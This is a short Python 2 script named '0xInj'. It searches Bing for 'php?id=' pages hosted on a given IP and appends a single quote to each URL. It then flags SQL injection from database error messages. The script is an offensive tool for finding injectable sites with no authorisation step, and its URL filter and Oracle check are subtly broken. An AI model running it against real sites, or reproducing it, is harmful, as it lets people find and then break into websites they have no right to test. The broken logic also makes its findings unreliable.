#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 0xInj v1.0
# Coded By: Abdullah AlZahrni
import urllib, requests
import lxml.html

print '''\033[1;36m
                        █▀▀█ █░█ ░▀░ █▀▀▄ ░░▀ 💉
                        █▄▀█ ▄▀▄ ▀█▀ █░░█ ░░█ 💉
                        █▄▄█ ▀░▀ ▀▀▀ ▀░░▀ █▄█ 💉
                        0xInj v1.0 💉
                        Coded By: Abdullah AlZahrni
                        Twitter : 0xAbdullah
                        GitHub.com/0xAbdullah
\033[1;m\n'''

try:
    ip = raw_input('Enter IP: ')
    while not ip:
        ip = raw_input('[!] Enter IP: ')
except:
    pass
headers = { 'User-Agent' : 'Mozilla/5.0' }
connection = urllib.urlopen("https://www.bing.com/search?q=ip:"+ip+" php?id=", None, headers)
dom =  lxml.html.fromstring(connection.read())

for url in dom.xpath('//a/@href'):
    if not url.startswith('http://') or url.startswith('https://') or url.startswith('www.') or url.startswith('https://go.microsoft') or url.startswith('http://go.microsoft') or url.startswith('http://www.microsofttranslator.com'):
        pass
    else:
        check = "'"
        print ("\nTesting %s" % (url))
        checker = requests.post(url+check)
        if "mysql" in checker.text.lower():
            print "\033[1;42m[*] SQL iNjection Found > Database type: MySQL \033[1;m"
        elif "native client" in checker.text.lower():
            print "\033[1;42m[*] SQL iNjection Found > Database type: MSSQL \033[1;m"
        elif "syntax error" in checker.text.lower():
            print "\033[1;42m[*] SQL iNjection Found > Database type: PostGRES \033[1;m"
        elif "ORA" in checker.text.lower():
            print "\033[1;42m[*] SQL iNjection Found > Database type: Oracle \033[1;m"
        else:
            print "\033[1;41m[!] Oops SQL iNjection Not Found ! \033[1;m"
print ("\n[#] Done !")
